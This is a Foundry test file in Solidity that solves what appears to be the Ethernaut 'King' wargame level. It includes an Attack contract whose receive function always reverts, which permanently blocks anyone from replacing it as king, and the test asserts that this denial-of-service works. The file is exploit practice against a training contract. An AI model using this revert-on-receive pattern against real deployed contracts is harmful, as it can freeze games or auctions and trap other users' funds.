// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/09_King.sol";

contract KingTest is Test {
    King instance;
    Attack attacker;
    address player1;
    address player2;

    function setUp() public {
        player1 = vm.addr(1);
        vm.deal(player1, 100);

        player2 = vm.addr(21);
        vm.deal(player2, 100);
        vm.startPrank(player2);
        instance = new King{value: 10}();
        vm.stopPrank();

        attacker = new Attack(payable(address(instance)));
    }

    function testattacker() public {
        assertNotEq(instance._king(), address(attacker));

        vm.startPrank(player1);

        attacker.attack{value: instance.prize() + 1}();
        assertEq(instance._king(), address(attacker));

        uint prize = instance.prize();
        vm.expectRevert("king!");
        (bool success, ) = address(instance).call{value: prize + 1}("");

        vm.stopPrank();
    }
}

contract Attack {
    King instance;

    constructor(address payable fb) payable {
        instance = King(fb);
    }

    function attack() public payable {
        (bool success, ) = address(instance).call{value: msg.value}("");
        require(success, "we are not the new king");
    }

    receive() external payable {
        revert("king!");
    }
}
